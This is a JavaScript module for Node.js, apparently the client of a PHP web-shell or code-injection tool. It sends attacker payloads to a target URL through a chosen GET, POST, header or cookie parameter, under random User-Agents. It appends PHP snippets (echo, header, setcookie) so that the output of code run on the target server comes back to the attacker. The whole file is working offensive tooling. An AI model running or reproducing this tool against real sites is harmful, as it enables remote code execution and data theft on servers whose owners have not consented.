let ApiCaller = require('request');
let UserAgent = require('random-useragent');

/*
 * @param string Host = target URL
 * @param int Method = Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
 * @param string Parameter = Infected parameters
 * @param int Crypt = Is it a crypted request
 * 
 * {object} callbacks = Default callbacks methods
 * string httpMethod = Http method for request 
 */
function Fuzzer(host, method, parameter, crypt) {
	this.host = host;
	this.method = parseInt(method);
	this.parameter = parameter;
	this.crypt = crypt;
	this.callbacks = {
		onSuccess: this.handleSuccess,
		onError: this.handleError
	};

	this.httpMethod = this.getHttpMethod();
	this.request = {};
}

Fuzzer.prototype.getHandleback = function getHandleback() {
	let response;

	switch(this.method) {
		case 0:
		case 1:
			response = "exit(echo($r));";
			break;
		case 2: 
			response = "header('" + this.parameter + ":' . $r);";
			break;
		case 3:
			response = "setcookie('" + this.parameter + "', $r);";
			break;
	}

	return response;
}

Fuzzer.prototype.getHttpMethod = function getHttpMethod() {
	if(this.method == 1) {
		return "POST"
	}

	return "GET";
}

Fuzzer.prototype.forgeRequest = function forgeRequest(r) {
	let request = {
		url: this.host,
		method: this.httpMethod,
		headers: {},
		form: {},
		jar: {}
	};

	request.headers["User-Agent"] = UserAgent.getRandom();
	r = r + this.getHandleback();

	switch(this.method) {
		case 0: //GET
			request.url = this.host + "?" + this.parameter + "=" + encodeURIComponent(r);
			break;
		case 1: //POST
			request.form[this.parameter] = r;
			break;
		case 2: //Header
			request.headers[this.parameter] = r;
			break;
		case 3: //Cookie
			let j = ApiCaller.jar(); 
			let cookie = ApiCaller.cookie(this.parameter + '=' + encodeURIComponent(r));
			j.setCookie(cookie, this.host);
			
			request.jar = j;
			break;
	}

	return request;
}

Fuzzer.prototype.send = function send(r, onSuccess, onError) {
	var self = this;
	this.request = this.forgeRequest(r);

	logger.log("info", "Final request: %j", this.request, {});

	if(typeof onSuccess == "function") {
		this.callbacks.onSuccess = onSuccess;
	}

	if(typeof onError == "function") {
		this.callbacks.onError = onError;
	}

	ApiCaller(this.request, function(error, response, body) {
		if(!error && response.statusCode == 200) {
			logger.log("info", "Response(obj): ", response);
			logger.log("info", "Response(body): ", body);

			if(self.request.jar != {}) {
				logger.log("info", "Response(cookies): ", self.request.jar.getCookies(self.host));
			}

			return self.callbacks.onSuccess(response, body, self);
		}

		logger.log("error", "Error: %j", error);

		return self.callbacks.onError(error, response, body, self);
	});
}

Fuzzer.prototype.handleSuccess = function handleSuccess(response, body, ref) {
}

Fuzzer.prototype.handleError = function handleError(error, response, body, ref) {
}

module.exports = Fuzzer;
